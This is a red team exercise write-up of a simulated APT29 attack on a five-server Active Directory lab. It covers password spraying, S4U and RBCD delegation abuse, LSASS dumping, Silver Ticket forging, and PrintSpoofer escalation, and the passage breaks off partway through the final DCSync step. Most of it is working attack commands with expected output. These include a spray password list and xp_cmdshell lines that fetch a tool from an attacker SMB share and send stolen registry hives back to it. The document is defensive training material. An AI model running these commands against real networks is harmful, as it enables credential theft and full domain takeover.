# APT29 — Operation SHATTERED CROWN
## Red Team Exercise Write-Up — Range 2: Delegation Nightmare

> **Classification:** RESTRICTED — Internal Red Team Use Only

| Field | Detail |
|---|---|
| **Environment** | 5 × Windows Server 2019 |
| **Domain** | cyberange.local / CYBERANGE |
| **Emulated Actor** | APT29 (Midnight Blizzard / NOBELIUM / Cozy Bear) |
| **Attack Chain** | Password Spray → S4U Delegation → LSASS Dump → Silver Ticket → RBCD → DCSync |
| **End Goal** | Full Domain Compromise — DCSync of cyberange.local |

---

## 1. Executive Summary

The full attack chain runs across five hosts: an IIS web frontend, a WinRM API backend, a Windows operations server, a MSSQL database server, and a Domain Controller. Starting from an unauthenticated password spray, the chain terminates with a full DCSync that extracts every credential hash in the **cyberange.local** domain — achieved without ever exploiting a software vulnerability, only misconfiguration and identity abuse.

### Attack Chain at a Glance

| Step | Source | Target | Technique | ATT&CK |
|---|---|---|---|---|
| 1 | Attacker (no creds) | DC02 (.10) | Password spray → svc_web credentials | T1110.003 |
| 2 | svc_web (domain user) | SRV05-API | S4U2Self + S4U2Proxy delegation abuse → impersonate DA | T1550.003 / T1558 |
| 3 | Local Admin hash (PTH) | SRV06-OPT | LSASS dump → extract svc_sql NT hash | T1003.001 |
| 4 | svc_sql NT hash | SRV07-SQL | Silver Ticket → xp_cmdshell → PrintSpoofer → SYSTEM | T1558.002 / T1134 |
| 5 | SRV07-SQL$ machine hash | DC02 (.10) | RBCD write → S4U → Domain Admin → DCSync | T1098 / T1003.006 |

---

## 2. Lab Environment

### 2.1 Host Inventory

| Hostname | OS | Role | Key Vulnerability |
|---|---|---|---|
| DC02.cyberange.local | Windows Server 2019 | Domain Controller + DNS | No lockout policy; RBCD misconfiguration on computer object |
| SRV04-WEB.cyberange.local | Windows Server 2019 | IIS Web Frontend | Password spray target — svc_web app pool with weak password |
| SRV05-API.cyberange.local | Windows Server 2019 | WinRM API Backend | Constrained delegation target — svc_web delegates to HTTP/SRV05-API |
| SRV06-OPT.cyberange.local | Windows Server 2019 | Operations Server | No RunAsPPL, WDigest enabled, cached svc_sql + backup_admin sessions |
| SRV07-SQL.cyberange.local | Windows Server 2019 | MSSQL Database | xp_cmdshell on, SeImpersonatePrivilege, SRV07-SQL$ has GenericWrite on DC02 |

### 2.2 Domain Accounts

| Account | Type | Group Membership | Purpose |
|---|---|---|---|
| svc_web | Service account | Domain Users | IIS app pool identity — SPRAY TARGET |
| svc_sql | Service account | Domain Users, Local Admin on SRV07-SQL | MSSQL service account — LSASS TARGET |
| backup_admin | Service account | Domain Admins | Backup agent — bonus DA in LSASS |
| jsmith, mjones, agarcia … (×10) | User accounts | Domain Users | Regular staff |

### 2.3 Key Misconfigurations

Three deliberate misconfigurations chain together to enable full compromise from a single weak password:

**No account lockout policy** — `LockoutThreshold` is set to 0 on the domain, meaning password spray attempts will never lock out any account. This allows the attacker to try every password on every user without time pressure.

**Constrained delegation with protocol transition on svc_web** — `svc_web` holds the `TrustedToAuthForDelegation` flag, which enables the S4U2Self extension. This allows the attacker to request a Kerberos service ticket impersonating any user — including Domain Admins — without that user ever authenticating to `svc_web` first. The `msDS-AllowedToDelegateTo` attribute permits forwarding that ticket to `HTTP/SRV05-API`.

**SRV07-SQL$ has GenericWrite on DC02's computer object** — this ACL was set during initial provisioning to allow automated patching scripts to run, and was never cleaned up. It allows the machine account of SRV07-SQL to write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on DC02, enabling a full RBCD attack to impersonate Domain Admin on the DC itself.

### 2.4 Boot Order

Boot **DC02 (.10)** first and wait 90 seconds for AD DS and DNS to fully initialise. The DC runs a startup script (`DC-SelfUpdate.ps1`) that updates its own DNS A record to reflect the new QEMU-assigned IP. All four member servers can then boot in any order — each runs `Find-DC.ps1` at startup, which calculates the DC IP by substituting `.10` into its own subnet, sets DNS, and verifies LDAP connectivity before completing.

The lab is fully operational approximately 3–5 minutes after all five VMs are running.

---

## 3. Environment Setup

Before running any attack step, execute the setup function from the attack script. This must be done from a **Kali Linux** attacker machine with network access to the lab subnet.

### 3.1 Required Tools

| Tool | Purpose |
|---|---|
| impacket (getST, ticketer, secretsdump, wmiexec, mssqlclient, addcomputer, rbcd, smbclient, lookupsid, GetUserSPNs, findDelegation, dacledit) | Covers the majority of the Kerberos chain |
| nxc (NetExec) | SMB enumeration, password spray, lsassy module for LSASS dumping |
| nmap | Network discovery and port scanning |
| kerbrute | Kerberos-based password spray (generates more realistic 4771 events) |
| PrintSpoofer64.exe | SeImpersonatePrivilege escalation to SYSTEM on SRV07-SQL |

### 3.2 Running Setup

Make the attack script executable and launch it as root, then select option `[0]` from the interactive menu.

```bash
chmod +x attack_chain.sh
sudo ./attack_chain.sh
# From the menu, select [0] — Setup Environment
```

The setup function performs the following automatically:

**Network discovery** — Scans the attacker's own `/24` subnet using nmap to locate all live lab hosts. It identifies each machine by reverse DNS PTR record, NetBIOS banner, or `nxc smb` hostname enumeration, then maps short names to FQDNs.

**`/etc/resolv.conf` update** — Points the attacker's DNS resolver at DC02's IP so that all FQDN lookups resolve correctly through the domain's DNS server.

**`/etc/hosts` population** — Writes all five FQDNs and their resolved IPs into `/etc/hosts` as a fallback for tools that do not honour `resolv.conf`.

**`/etc/krb5.conf` configuration** — Writes the Kerberos realm configuration pointing at DC02 as the KDC and admin server. This is required for all Impacket tools that use `-k` (Kerberos authentication).

**Clock synchronisation** — Queries DC02's SMB2 timestamp to synchronise the attacker clock. Kerberos authentication will fail with a clock skew greater than five minutes.

**Tool verification** — Checks all required Impacket components, nxc, nmap, kerbrute, and PrintSpoofer64.exe are present and reports any missing before the chain begins.

**State persistence** — All extracted credentials are written to `/opt/redteam/loot/.state` after each step. If a step is interrupted, re-running it reloads the last saved state. Use option `[S]` to view current state at any time.

---

## Step 1 — Reconnaissance + Password Spray

**Target:** `DC02.cyberange.local (.10) via SRV04-WEB (.20)` &nbsp;|&nbsp; **MITRE:** T1110.003 — Password Spraying

### What This Step Does

The domain password policy has `LockoutThreshold = 0`, meaning there is no account lockout — the attacker can spray passwords against every account indefinitely without triggering a lockout. This step enumerates all domain user accounts via SMB RID brute-force, then sprays a list of seasonally predictable passwords. The service account `svc_web` was provisioned with the password `Summer2025!` and has never had it changed. It falls to the spray immediately.

After recovering the password, the step validates it by requesting a TGT and performs authenticated post-spray enumeration — dumping SPNs and delegation settings — which reveals the constrained delegation configuration that enables Step 2.

### Why It Works

The combination of no lockout policy and a weak seasonal password on a service account is the initial access condition. Service accounts in Active Directory environments are frequent spray targets because they often have passwords set at provisioning and never rotated. The `LockoutThreshold = 0` setting — set here to keep the lab deterministic — mirrors real environments where administrators disable lockout to avoid availability issues.

### Phase 1a — Network Discovery

Scan the lab subnet to locate all live hosts and perform per-host service enumeration to understand the attack surface.

```bash
# Broad subnet discovery — identify all live hosts
nmap -sT -T4 --top-ports 1000 -oN /opt/redteam/loot/nmap_subnet.txt <SUBNET>.0/24

# Per-host service scans — enumerate relevant ports on each machine
nmap -sT -sV -p 53,80,88,135,139,389,445,636,3268,3389,5985 -oN /opt/redteam/loot/nmap_DC02.txt DC02.cyberange.local
nmap -sT -sV -p 80,135,139,443,445,5985 -oN /opt/redteam/loot/nmap_SRV04-WEB.txt SRV04-WEB.cyberange.local
nmap -sT -sV -p 80,135,139,445,5985,5986 -oN /opt/redteam/loot/nmap_SRV05-API.txt SRV05-API.cyberange.local
nmap -sT -sV -p 135,139,445,3389,5985 -oN /opt/redteam/loot/nmap_SRV06-OPT.txt SRV06-OPT.cyberange.local
nmap -sT -sV -p 135,139,445,1433,3389,5985 -oN /opt/redteam/loot/nmap_SRV07-SQL.txt SRV07-SQL.cyberange.local
```

### Phase 1b — SMB Enumeration and User Harvesting

Use null-session SMB access to RID brute-force the domain and build a complete user list before spraying. This avoids guessing usernames and ensures the spray covers all real accounts.

```bash
# SMB host discovery — fingerprint all Windows hosts on the subnet
nxc smb <SUBNET>.0/24 2>&1 | tee /opt/redteam/loot/smb_hosts.txt

# Null session share enumeration on the DC
nxc smb DC02.cyberange.local -u '' -p '' --shares 2>&1 | tee /opt/redteam/loot/smb_shares_null.txt

# RID brute-force — enumerates all domain users, groups, and computers without authentication
nxc smb DC02.cyberange.local -u '' -p '' --rid-brute 2>&1 | tee /opt/redteam/loot/rid_brute.txt

# Extract just the user accounts from the RID output
grep 'SidTypeUser' /opt/redteam/loot/rid_brute.txt | grep -oP '\\\K[^\s(]+' | sort -u > /opt/redteam/loot/discovered_users.txt
```

### Phase 1c — Password Spray

Spray the seasonal password list against all discovered users. The `kerbrute` tool uses the Kerberos pre-authentication protocol directly, generating Event 4771 failures on DC02 rather than SMB logon failures — more realistic APT29 tradecraft. `nxc` is the fallback if kerbrute is inconclusive.

```bash
# Primary: Kerberos-based spray with kerbrute
# Each failed attempt generates 4771 on DC02 — blue team forensic artefact
kerbrute \
  -users /opt/redteam/users.txt \
  -passwords /opt/redteam/wordlists/passwords.txt \
  -domain cyberange.local \
  -dc-ip <DC_IP> \
  -threads 5 \
  -outputfile /opt/redteam/loot/kerbrute_hits.txt

# Fallback: SMB-based spray with nxc
nxc smb DC02.cyberange.local \
  -u /opt/redteam/users.txt \
  -p /opt/redteam/wordlists/passwords.txt \
  --no-bruteforce \
  2>&1 | tee /opt/redteam/loot/nxc_spray.txt
```

**Password list used:**

```
Spring2025!
Summer2025!
Autumn2025!
Winter2025!
Welcome2025!
P@ssw0rd123
Company2025!
Cyberange2025!
Password1!
ChangeMe2025!
```

### Phase 1d — Validate the Credential and Request a TGT

Request a Kerberos TGT to confirm the recovered credential is valid. A successful TGT proves the password is correct and also seeds the Kerberos credential cache for subsequent steps.

```bash
# Request a TGT for svc_web — confirms the password is accepted by the KDC
impacket-getTGT 'cyberange.local/svc_web:Summer2025!' -dc-ip <DC_IP>

# The .ccache file is saved in the current directory
ls -la svc_web.ccache
```

### Phase 1e — Post-Spray Authenticated Enumeration

With valid credentials, enumerate SPNs and delegation settings. This reveals the constrained delegation configuration on `svc_web` that the next step exploits.

```bash
# Enumerate all Kerberoastable SPNs in the domain
impacket-GetUserSPNs 'cyberange.local/svc_web:Summer2025!' \
  -dc-ip <DC_IP> -request \
  2>&1 | tee /opt/redteam/loot/spns.txt

# Enumerate all delegation configurations — shows svc_web → HTTP/SRV05-API
impacket-findDelegation 'cyberange.local/svc_web:Summer2025!' \
  -dc-ip <DC_IP> \
  2>&1 | tee /opt/redteam/loot/delegation.txt
```

**Expected findDelegation output — key entries:**

```
AccountName    AccountType  DelegationType                      DelegationRightsTo
-----------    -----------  --------------                      ----------------------
svc_web        User         Constrained w/ Protocol Transition  HTTP/SRV05-API.cyberange.local
```

The `Constrained w/ Protocol Transition` entry confirms `TrustedToAuthForDelegation = True` on `svc_web`, which is the condition for S4U2Self — the attacker does not need a user to authenticate to `svc_web` first.

> **Step 1 Result:** `svc_web:Summer2025!` — TGT confirmed valid. Constrained delegation to `HTTP/SRV05-API.cyberange.local` with protocol transition confirmed.

---

## Step 2 — S4U2Self / S4U2Proxy Delegation Abuse

**Target:** `SRV05-API.cyberange.local (.30)` &nbsp;|&nbsp; **MITRE:** T1550.003 — Pass the Ticket / T1558 — Steal or Forge Kerberos Tickets

### What This Step Does

Using the `svc_web` credential, the attacker abuses Kerberos constrained delegation to obtain a service ticket that impersonates the domain Administrator — without knowing the Administrator's password and without the Administrator ever authenticating to anything. The resulting ticket grants full SMB/CIFS access to SRV05-API as Administrator, from which the local SAM database is dumped to recover the local Administrator NT hash.

### Why It Works

Two Active Directory settings on `svc_web` make this possible:

`TrustedToAuthForDelegation = True` enables the **S4U2Self** extension. Normally, constrained delegation requires a user to authenticate to the service first (so the KDC can issue a forwardable service ticket). With S4U2Self enabled, the service account can request a service ticket for any user in the domain entirely on its own — the user never needs to be involved. The KDC issues the ticket on the service account's assertion alone.

`msDS-AllowedToDelegateTo` lists `HTTP/SRV05-API.cyberange.local` as a permitted delegation target. This allows the S4U2Self ticket to be forwarded via **S4U2Proxy** — effectively impersonating Administrator when presenting the ticket to SRV05-API's HTTP/WinRM service.

The `-altservice` flag in `getST` rewrites the service class in the ticket from `HTTP` to `CIFS` after the delegation chain completes, enabling SMB access rather than WinRM — a more useful primitive for credential dumping.

### Phase 2a — Scan SRV05-API

Confirm the target is reachable and WinRM is available before executing the delegation chain.

```bash
# Confirm open ports on SRV05-API — looking for 5985 (WinRM) and 445 (SMB)
nmap -sT -sV -p 80,135,139,445,5985,5986 \
  -oN /opt/redteam/loot/nmap_SRV05-API_detail.txt \
  SRV05-API.cyberange.local
```

### Phase 2b — Execute the S4U Delegation Chain

Run `getST` with both S4U2Self and S4U2Proxy in a single command. The `-impersonate` flag specifies the user to impersonate; `-altservice` rewrites the SPN in the resulting ticket from `HTTP` to `CIFS` so the ticket is accepted for SMB access.

Before running, clear any existing Kerberos credential caches and synchronise the attacker clock to DC02. Kerberos tickets are timestamp-sensitive and will be rejected if the clock skew exceeds five minutes.

```bash
# Clear any existing ccache files to avoid stale ticket conflicts
unset KRB5CCNAME
rm -f /opt/redteam/*.ccache

# Execute the full S4U chain — S4U2Self requests ticket for Administrator,
# S4U2Proxy forwards it to HTTP/SRV05-API, -altservice rewrites SPN to CIFS
impacket-getST 'cyberange.local/svc_web:Summer2025!' \
  -spn 'HTTP/SRV05-API.cyberange.local' \
  -impersonate Administrator \
  -altservice 'CIFS/SRV05-API.cyberange.local' \
  -dc-ip <DC_IP>

# getST saves the ccache in the working directory — load it into the environment
export KRB5CCNAME=$(ls -t /opt/redteam/*.ccache | head -1)
echo "Using ticket: $KRB5CCNAME"
```

### Phase 2c — Verify Administrator Access to SRV05-API

Confirm the forged ticket is accepted by SRV05-API before dumping credentials.

```bash
# Execute a WMI command as Administrator using the Kerberos ticket
# -k uses the KRB5CCNAME ccache; -no-pass skips password prompts
impacket-wmiexec -k -no-pass \
  'cyberange.local/Administrator@SRV05-API.cyberange.local' \
  'whoami && hostname && ipconfig'

# Expected output:
# cyberange\administrator
# SRV05-API
```

### Phase 2d — Dump Local Credentials from SRV05-API

With Administrator access confirmed, dump the local SAM database to recover the local Administrator NT hash. This hash is shared across all servers provisioned from the same template image — SRV05-API, SRV06-OPT, and SRV07-SQL.

```bash
# Dump SAM, LSA secrets, and cached credentials from SRV05-API
impacket-secretsdump -k -no-pass \
  'cyberange.local/Administrator@SRV05-API.cyberange.local' \
  2>&1 | tee /opt/redteam/loot/secretsdump_srv05.txt

# Extract the local Administrator NT hash — it is the 4th colon-separated field
grep '^Administrator:500:' /opt/redteam/loot/secretsdump_srv05.txt | awk -F: '{print $4}'
```

**Expected output format:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NT_HASH>:::
```

The recovered hash is the **local** Administrator account hash. It applies to SRV05-API, SRV06-OPT, and SRV07-SQL — use `--local-auth` when authenticating with it in subsequent steps, since it is not a domain account hash.

> **Step 2 Result:** Local Administrator NT hash recovered from SRV05-API. Confirmed valid for SMB pass-the-hash to SRV06-OPT and SRV07-SQL.

---

## Step 3 — Lateral Movement to SRV06-OPT + LSASS Dump

**Target:** `SRV06-OPT.cyberange.local (.40)` &nbsp;|&nbsp; **MITRE:** T1003.001 — OS Credential Dumping: LSASS Memory

### What This Step Does

Using the local Administrator NT hash from Step 2, the attacker authenticates to SRV06-OPT as a local administrator via SMB pass-the-hash. SRV06-OPT has LSASS protections fully disabled — no RunAsPPL, no Credential Guard, and WDigest credential caching is enabled. Two domain accounts have persistent logon sessions on this machine maintained by scheduled tasks: `CYBERANGE\svc_sql` running the `CorpOpsHealthMonitor` task, and `CYBERANGE\backup_admin` (a Domain Admin) running the `CorpBackupAgent` task. Both accounts' credentials are recoverable from LSASS memory.

### Why It Works

Three misconfigurations on SRV06-OPT make this attack possible:

| Setting | Value | Impact |
|---|---|---|
| RunAsPPL | 0 (disabled) | LSASS runs as a normal process — any local admin can dump it |
| WDigest UseLogonCredential | 1 (enabled) | Cleartext passwords are cached in LSASS alongside NT hashes |
| Credential Guard | Disabled | LSASS is not isolated in a Hyper-V secured container |

The scheduled tasks create Type 4 (batch) logon sessions for `svc_sql` and `backup_admin` at startup. These sessions keep the accounts' credentials live in LSASS for the duration the machine is running — no interactive user logon is needed.

### Phase 3a — Verify Pass-the-Hash Access to SRV06-OPT

Confirm the local Administrator hash from Step 2 grants local admin rights on SRV06-OPT before attempting to dump LSASS.

```bash
# Verify local admin PTH access — (Pwn3d!) in the output confirms administrator rights
nxc smb SRV06-OPT.cyberange.local \
  -u Administrator -H '<LOCAL_ADMIN_HASH>' \
  --local-auth

# Confirm active domain sessions on the machine via WMI — should show svc_sql running
impacket-wmiexec './Administrator@SRV06-OPT.cyberange.local' \
  -hashes ':<LOCAL_ADMIN_HASH>' \
  'whoami && hostname && net localgroup Administrators'
```

### Phase 3b — Dump LSASS (Primary Method — lsassy)

The `lsassy` module in nxc remotely dumps LSASS using the `comsvcs.dll MiniDump` method without dropping any additional tools to disk on the target.

```bash
# Dump LSASS remotely using the lsassy nxc module
nxc smb SRV06-OPT.cyberange.local \
  -u Administrator -H '<LOCAL_ADMIN_HASH>' \
  --local-auth \
  -M lsassy \
  2>&1 | tee /opt/redteam/loot/lsassy_srv06.txt

# Extract the svc_sql NT hash from the dump output
grep -i 'svc_sql' /opt/redteam/loot/lsassy_srv06.txt
# SRV06-OPT    445    SRV06-OPT    svc_sql    CYBERANGE    <NT_HASH>
```

### Phase 3c — Fallback Method — secretsdump

If lsassy fails due to a module dependency issue, use Impacket's secretsdump with local authentication.

```bash
# Dump all credentials from SRV06-OPT using secretsdump with local admin PTH
impacket-secretsdump './Administrator@SRV06-OPT.cyberange.local' \
  -hashes ':<LOCAL_ADMIN_HASH>' \
  2>&1 | tee /opt/redteam/loot/secretsdump_srv06.txt

# Extract svc_sql — NT hash is the 4th colon-separated field
grep -i 'svc_sql' /opt/redteam/loot/secretsdump_srv06.txt | awk -F: '{print $4}'

# Also extract the backup_admin DA hash for the blue team forensic artefact
grep -i 'backup_admin' /opt/redteam/loot/secretsdump_srv06.txt | awk -F: '{print $4}'
```

### Phase 3d — Retrieve the Domain SID

The Domain SID is required to forge the Silver Ticket in Step 4. Extract it from any authenticated lookupsid query or from the secretsdump output.

```bash
# Query the DC for the Domain SID using svc_web credentials
impacket-lookupsid 'cyberange.local/svc_web:Summer2025!@DC02.cyberange.local' 0 \
  2>&1 | grep -oP 'S-1-5-21-[\d-]+'

# Alternatively, extract it from any secretsdump output already on disk
grep -oP 'S-1-5-21-[\d-]+' /opt/redteam/loot/secretsdump_srv06.txt | head -1
```

> **Step 3 Result:** `svc_sql` NT hash recovered from LSASS on SRV06-OPT. Domain SID extracted. `backup_admin` (Domain Admin) NT hash also present as a bonus forensic artefact.

---

## Step 4 — Silver Ticket + MSSQL + PrintSpoofer Privilege Escalation

**Target:** `SRV07-SQL.cyberange.local (.50)` &nbsp;|&nbsp; **MITRE:** T1558.002 — Silver Ticket / T1134 — Access Token Manipulation

### What This Step Does

The attacker forges a Silver Ticket for the `MSSQLSvc/SRV07-SQL.cyberange.local:1433` SPN using the `svc_sql` NT hash. This ticket authenticates directly to the SQL Server instance without the Domain Controller issuing or validating it — meaning no Event 4769 is generated on DC02 during authentication. This is the defining characteristic of a Silver Ticket attack and the primary blue team detection gap this step is designed to teach.

With SQL Server access confirmed, the attacker uses `xp_cmdshell` to execute OS commands as the `svc_sql` service account, which holds `SeImpersonatePrivilege`. PrintSpoofer64.exe is uploaded via an authenticated SMB share on the attacker machine and used to escalate from `svc_sql` to `NT AUTHORITY\SYSTEM`. As SYSTEM, the SAM, SYSTEM, and SECURITY registry hives are saved and exfiltrated back to the attacker. The SECURITY hive contains the `SRV07-SQL$` machine account NT hash, which is the prerequisite for Step 5.

### Why It Works

A Silver Ticket is a Kerberos service ticket forged entirely offline using the service account's NT hash. Because Kerberos service tickets are encrypted with the service account's key — not the KDC's key — the DC is not involved in their validation. SQL Server decrypts the ticket with `svc_sql`'s password, sees a valid Administrator PAC, and grants access. The DC never sees the ticket and generates no 4769 event.

`SeImpersonatePrivilege` on `svc_sql` is the escalation condition. SQL Server service accounts typically hold this privilege by design. PrintSpoofer exploits the Windows Named Pipe impersonation mechanism to acquire a SYSTEM token and execute commands with it.

### Phase 4a — Scan SRV07-SQL

Confirm MSSQL port 1433 is open and reachable before forging the ticket.

```bash
# Confirm MSSQL and relevant ports are open on SRV07-SQL
nmap -sT -sV -p 135,139,445,1433,3389,5985 \
  -oN /opt/redteam/loot/nmap_SRV07-SQL_detail.txt \
  SRV07-SQL.cyberange.local
```

### Phase 4b — Forge the Silver Ticket

Forge the Silver Ticket offline using the `svc_sql` NT hash and Domain SID. No DC interaction is required at this stage — the ticket is built entirely on the attacker machine.

```bash
# Clear any existing ccache files and synchronise the clock before forging
unset KRB5CCNAME
rm -f /opt/redteam/*.ccache

# Forge the Silver Ticket — encrypted with svc_sql's NT hash, no DC involvement
# -nthash     : svc_sql's NT hash (used to encrypt the ticket)
# -domain-sid : Domain SID (for the PAC - Privileged Attribute Certificate)
# -spn        : Target SPN — must match exactly what SQL Server expects
# Administrator : The username to embed in the PAC (impersonated user)
impacket-ticketer \
  -nthash '<SVC_SQL_HASH>' \
  -domain-sid '<DOMAIN_SID>' \
  -domain cyberange.local \
  -spn 'MSSQLSvc/SRV07-SQL.cyberange.local:1433' \
  -dc-ip <DC_IP> \
  Administrator

# Load the forged ticket into the Kerberos credential cache
export KRB5CCNAME=/opt/redteam/Administrator.ccache
```

### Phase 4c — Connect to MSSQL and Execute Commands

Authenticate to SQL Server using the forged Silver Ticket and confirm `xp_cmdshell` is available and that `svc_sql` holds `SeImpersonatePrivilege`.

```bash
# Connect to MSSQL using the Silver Ticket — no DC authentication occurs at this point
# -k          : Use Kerberos (KRB5CCNAME)
# -no-pass    : Do not prompt for a password
# -windows-auth : Use Windows Authentication (Kerberos/NTLM) rather than SQL auth
impacket-mssqlclient \
  -k -no-pass \
  'cyberange.local/Administrator@SRV07-SQL.cyberange.local' \
  -windows-auth

# Once connected, run the following SQL commands:
EXEC xp_cmdshell 'whoami';
# Output: cyberange\svc_sql

EXEC xp_cmdshell 'whoami /priv';
# Look for: SeImpersonatePrivilege — Enabled
# This confirms PrintSpoofer will work
```

### Phase 4d — Upload PrintSpoofer via Authenticated SMB

Host an authenticated SMB share on the attacker machine, then use `xp_cmdshell` to download PrintSpoofer64.exe from it into the target's Temp directory. Authentication is required because Windows by default blocks anonymous SMB access from external sources.

```bash
# On the attacker machine — start an authenticated SMB share serving /opt/redteam/tools/
# Run this in a separate terminal before connecting to MSSQL
impacket-smbserver \
  -smb2support \
  -username att \
  -password att \
  share /opt/redteam/tools/ &

# Inside the MSSQL session — map the attacker SMB share and copy PrintSpoofer
EXEC xp_cmdshell 'net use \\<ATTACKER_IP>\share /user:att att';
EXEC xp_cmdshell 'copy \\<ATTACKER_IP>\share\PrintSpoofer64.exe C:\Windows\Temp\PrintSpoofer64.exe /Y';
EXEC xp_cmdshell 'net use \\<ATTACKER_IP>\share /delete /y';

# Verify the file is present on the target
EXEC xp_cmdshell 'dir C:\Windows\Temp\PrintSpoofer64.exe';
```

### Phase 4e — Escalate to SYSTEM and Dump Registry Hives

Use PrintSpoofer to execute commands as `NT AUTHORITY\SYSTEM` and save the three registry hives needed to extract the machine account hash offline.

```bash
# Confirm PrintSpoofer works — should return NT AUTHORITY\SYSTEM
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "whoami"';

# Save the three registry hives as SYSTEM — these contain all local credentials
# including the machine account NT hash in the SECURITY hive
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "reg save HKLM\SAM C:\Windows\Temp\sam.save /y"';
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "reg save HKLM\SYSTEM C:\Windows\Temp\system.save /y"';
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "reg save HKLM\SECURITY C:\Windows\Temp\security.save /y"';
```

### Phase 4f — Exfiltrate Hives and Parse Offline

Redirect the SMB share to the loot directory, copy the hive files back to the attacker machine, then parse them offline with secretsdump to extract the `SRV07-SQL$` machine account NT hash.

```bash
# On the attacker machine — restart the SMB share pointing at the loot/hives directory
mkdir -p /opt/redteam/loot/hives
impacket-smbserver \
  -smb2support \
  -username att \
  -password att \
  share /opt/redteam/loot/hives/ &

# Inside the MSSQL session — copy hives to the attacker share using SYSTEM context
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "cmd /c net use \\<ATTACKER_IP>\share /user:att att"';
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "cmd /c copy C:\Windows\Temp\sam.save \\<ATTACKER_IP>\share\sam.save /Y"';
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "cmd /c copy C:\Windows\Temp\system.save \\<ATTACKER_IP>\share\system.save /Y"';
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "cmd /c copy C:\Windows\Temp\security.save \\<ATTACKER_IP>\share\security.save /Y"';
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "cmd /c net use \\<ATTACKER_IP>\share /delete /y"';

# On the attacker machine — parse the hives offline to extract all local credentials
# The $MACHINE.ACC entry in the SECURITY hive contains the machine account NT hash
impacket-secretsdump \
  -sam /opt/redteam/loot/hives/sam.save \
  -system /opt/redteam/loot/hives/system.save \
  -security /opt/redteam/loot/hives/security.save \
  LOCAL \
  2>&1 | tee /opt/redteam/loot/srv07_local_hashes.txt

# Extract the machine account NT hash — look for $MACHINE.ACC
grep 'MACHINE.ACC:' /opt/redteam/loot/srv07_local_hashes.txt | grep -oP '[a-f0-9]{32}' | tail -1
```

**Expected output — key entries:**

```
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:<SRV07_MACHINE_HASH>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<LOCAL_ADMIN_HASH>
```

> **Step 4 Result:** `NT AUTHORITY\SYSTEM` on SRV07-SQL. `SRV07-SQL$` machine account NT hash extracted from the SECURITY hive. No Event 4769 was generated on DC02 for the Silver Ticket authentication.

---

## Step 5 — RBCD Abuse → Domain Admin → DCSync

**Target:** `DC02.cyberange.local (.10)` &nbsp;|&nbsp; **MITRE:** T1098 — Account Manipulation / T1003.006 — DCSync

### What This Step Does

`SRV07-SQL$` has `GenericWrite` on DC02's computer object in Active Directory — a misconfiguration left over from provisioning. `GenericWrite` on a computer object includes the ability to write `msDS-AllowedToActOnBehalfOfOtherIdentity`, the attribute that controls Resource-Based Constrained Delegation (RBCD).

The attacker uses the `SRV07-SQL$` machine hash to write this attribute on DC02, configuring it to trust a newly created attacker-controlled machine account (`COMP$`) for delegation. The default `MachineAccountQuota = 10` allows any authenticated domain user to create machine accounts, so `svc_web` is used to create `COMP$`. S4U2Self + S4U2Proxy then produces a service ticket impersonating Administrator for `CIFS/DC02` — granting full Domain Admin access to the DC. DCSync extracts every credential hash in the domain.

### Why It Works

RBCD places the delegation trust decision on the **resource** (DC02) rather than the service being delegated from. Whoever can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object can grant any other principal the ability to delegate to it. Because `SRV07-SQL$` has `GenericWrite` on DC02, it can write this attribute — and because the SYSTEM context on SRV07-SQL authenticates as `SRV07-SQL$`, the machine hash from Step 4 is the key.

Once the RBCD attribute is written, the chain is identical to Step 2: S4U2Self generates a service ticket for Administrator, S4U2Proxy forwards it to `CIFS/DC02`, and the result is an Administrator-level Kerberos ticket for the Domain Controller.

### Phase 5a — Enumerate the GenericWrite ACL on DC02

Confirm the `SRV07-SQL$` GenericWrite permission exists before attempting to write the RBCD attribute.

```bash
# Read the ACL on DC02's computer object — confirms SRV07-SQL$ has GenericWrite
impacket-dacledit \
  'cyberange.local/svc_web:Summer2025!' \
  -dc-ip <DC_IP> \
  -target 'DC02$' \
  -action read \
  2>&1 | tee /opt/redteam/loot/dc02_acl.txt

# Look for SRV07-SQL$ with GenericWrite in the output
grep -i 'SRV07' /opt/redteam/loot/dc02_acl.txt
```

### Phase 5b — Create the Attacker-Controlled Machine Account

Create a new machine account `COMP$` using `svc_web` credentials. The default `MachineAccountQuota = 10` allows any authenticated domain user to create up to 10 machine accounts. This machine account will be the S4U delegation source.

```bash
# Create machine account COMP$ with a known password
# The account will be used as the S4U2Self source in the delegation chain
impacket-addcomputer \
  'cyberange.local/svc_web:Summer2025!' \
  -computer-name 'COMP$' \
  -computer-pass 'FakeP@ss123!' \
  -dc-ip <DC_IP>
```

### Phase 5c — Write the RBCD Attribute on DC02

Use the `SRV07-SQL$` machine hash to write the RBCD attribute on DC02, configuring it to trust `COMP$` for delegation. This is the core exploitation step.

```bash
# Write msDS-AllowedToActOnBehalfOfOtherIdentity on DC02 using SRV07-SQL$ GenericWrite
# -delegate-to   : The computer being configured (DC02$ — the resource trusting the delegation)
# -delegate-from : The machine account being trusted (COMP$ — the attacker-controlled principal)
impacket-rbcd \
  'cyberange.local/SRV07-SQL$' \
  -hashes ':<SRV07_MACHINE_HASH>' \
  -delegate-to 'DC02$' \
  -delegate-from 'COMP$' \
  -action write \
  -dc-ip <DC_IP>

# Verify the attribute was written correctly
impacket-rbcd \
  'cyberange.local/SRV07-SQL$' \
  -hashes ':<SRV07_MACHINE_HASH>' \
  -delegate-to 'DC02$' \
  -action read \
  -dc-ip <DC_IP>
```

### Phase 5d — S4U to Obtain a Domain Admin Ticket for DC02

Run the S4U chain from `COMP$` to obtain a Kerberos service ticket impersonating Administrator for `CIFS/DC02`. This is structurally identical to Step 2 but targets the Domain Controller directly.

```bash
# Clear existing ccache files and synchronise the clock
